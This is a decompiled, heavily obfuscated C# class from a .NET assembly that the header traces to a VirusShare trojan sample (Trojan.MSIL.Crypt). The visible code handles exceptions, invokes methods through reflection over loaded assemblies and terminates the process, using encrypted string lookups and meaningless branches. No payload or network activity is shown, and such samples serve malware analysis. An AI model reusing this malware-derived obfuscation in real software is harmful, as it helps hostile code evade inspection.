// Decompiled with JetBrains decompiler
// Type: .
// Assembly: syncui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=cab8849a7bf7875b
// MVID: B8136FDA-4EB0-4CA7-9502-281BC34A634B
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.hjc-f20e5d33e431ce6f4aedcb085c959ae1bda3809f8f5bbdd4d18dd58683a28d4d.exe

using \u0001;
using \u0003;
using \u0004;
using \u0005;
using \u0007;
using \u0008;
using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

namespace \u0004
{
  internal abstract class \u0004
  {
    private static readonly bool \u0001;
    internal static readonly string \u0001;
    internal static \u0004.\u0004 \u0001;
    private IWebProxy \u0001;
    internal EventHandler \u0001;
    internal \u000E.\u0004 \u0001;
    [NonSerialized]
    internal static \u0007.\u0003 \u0086;

    protected abstract void \u0001([In] \u0002 obj0);

    protected abstract void \u0001([In] \u0002 obj0);

    protected abstract void \u0001([In] \u0002 obj0);

    protected virtual Guid \u0001() => Guid.Empty;

    internal bool \u0001([In] SecurityException obj0)
    {
      if (true)
        goto label_6;
label_5:
      int num = 1;
      return num == 0 ? num != 0 : num != 0;
label_6:
      \u0002 obj = new \u0002(obj0);
      if (true)
      {
        this.\u0001(obj);
        if (obj.\u0002)
          return false;
        if (!obj.\u0001)
        {
          \u009A\u0003.\u0016\u0006();
          goto label_5;
        }
        else
          goto label_5;
      }
      else
        goto label_5;
    }

    internal unsafe void \u0001([In] Exception obj0, [In] bool obj1, [In] bool obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      \u0012.\u0001(2U);
      Type type = \u001D.\u007E\u0013\u0002((object) obj0);
      if (\u001E.\u0018\u0002(\u0018.\u007E\u0095((object) type), \u0004.\u0004.\u0086(605)) && \u001E.\u0018\u0002(\u0018.\u007E\u0096((object) type), \u0004.\u0004.\u0086(630)))
        obj0 = (Exception) \u007F.\u007E\u001B\u0002((object) \u001F.\u007E\u001A\u0002((object) type, \u0004.\u0004.\u0086(675)), (object) obj0);
      *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
      if (obj0 == null)
        return;
      if (obj0 is ThreadAbortException)
        return;
      try
      {
        \u0005.\u0003 obj3 = new \u0005.\u0003(this.\u0001(), obj0, this.\u0001);
        \u0012.\u0001(new \u000E.\u0004(((\u0012) this).\u0001), (\u0006) obj3);
        \u0012.\u0001(new EventHandler(((\u0012) this).\u0001), obj3);
        \u0012.\u0001(new \u0003.\u0001(this.\u0001), obj3);
        \u0002 obj4 = new \u0002(obj3, obj0);
        if (\u0012.\u0001() != null)
          obj4.\u0001 = true;
        if (!obj1)
        {
          obj4.\u0003 = false;
          obj4.\u0004 = false;
        }
        else if (obj2 || \u0004.\u0004.\u0001)
        {
          obj4.\u0003 = false;
          if (true)
            obj4.\u0004 = true;
        }
        this.\u0001(obj4);
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) !obj4.\u0004;
      }
      catch (ThreadAbortException ex)
      {
      }
      catch (Exception ex)
      {
        this.\u0001(new \u0002(ex));
      }
      if (*(sbyte*) ((IntPtr) voidPtr + 4) == (sbyte) 0)
        return;
      Assembly[] assemblyArray = \u0086.\u007E\u0095\u0002((object) \u0084.\u0094\u0002());
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < assemblyArray.Length)
      {
        Assembly assembly = assemblyArray[*(int*) voidPtr];
        try
        {
          string str = \u0018.\u007E\u0002\u0002((object) assembly);
          if (\u009D.\u007E\u0080\u0003((object) str, \u0004.\u0004.\u0086(5494)))
          {
            if (\u009D.\u007E\u007F\u0003((object) str, \u0004.\u0004.\u0086(5519)))
            {
              object obj5 = \u009D\u0003.\u007E\u0019\u0006((object) \u009C\u0003.\u007E\u0018\u0006((object) \u009B\u0003.\u007E\u0017\u0006((object) \u001D\u0003.\u007E\u008E\u0005((object) assembly, \u0004.\u0004.\u0086(5552)), \u0004.\u0004.\u0086(5589))), (object) null, (object[]) null);
              object obj6 = \u009D\u0003.\u007E\u0019\u0006((object) \u009E\u0003.\u007E\u001A\u0006((object) \u001D.\u007E\u0017\u0002(obj5), \u0004.\u0004.\u0086(5602), new Type[0]), obj5, (object[]) null);
            }
          }
        }
        catch
        {
        }
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      try
      {
        \u009A\u0003.\u0016\u0006();
      }
      catch
      {
        try
        {
          \u009F\u0003.\u001B\u0006(0);
        }
        catch
        {
        }
      }
    }

    private void \u0001([In] object obj0, [In] \u0002 obj1) => this.\u0001(obj1);

    static \u0004()
    {
      if (false)
        return;
      \u0002.\u0001(typeof (\u0004.\u0004));
      \u0004.\u0004.\u0001 = \u0012\u0003.\u0081\u0005(\u0004.\u0004.\u0086(5615));
      \u0004.\u0004.\u0001 = \u0004.\u0004.\u0086(700);
    }
  }
}
